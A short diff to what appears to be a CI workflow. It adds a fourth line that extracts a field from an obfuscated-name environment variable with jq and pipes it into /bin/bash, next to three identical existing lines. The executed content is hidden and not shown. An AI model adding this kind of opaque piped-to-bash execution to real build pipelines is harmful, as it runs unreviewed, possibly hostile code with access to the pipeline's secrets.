@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$nv256" | jq -r .kf5214 | /bin/bash
           echo $ed8 | jq -r .vb66 | /bin/bash
           echo $col8 | jq -r .mnk32 | /bin/bash
+          echo $c59720 | jq -r .vy39481 | /bin/bash
 
       - name: Upload artifact
         if: always()
